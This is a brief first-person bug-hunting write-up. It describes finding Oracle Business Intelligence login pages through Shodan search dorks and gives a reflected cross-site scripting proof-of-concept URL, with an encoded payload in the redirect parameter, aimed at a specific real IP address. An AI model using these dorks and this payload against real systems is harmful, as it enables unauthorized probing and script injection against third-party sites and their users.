This is my first write-up. I was scrolling through twitter and I found this great tip:


![](/assets/images/crackmes/xss.png)

So I quickly went to shodan and write this dork:

    html:">Oracle Business Intelligence"

to find the websites that is vulnerable to this CVE with organizations names so the final dork was like this:

    html:">Oracle Business Intelligence" org:amazon

I found an IP which is owned by Amazon that is vulnerable to this CVE

the final POC is :

https://52.46.133.78/bi-security-login/login.jsp?msi=false&redirect=%22%3E%3Cimg/src/onerror%3dalert(document.domain)%3E
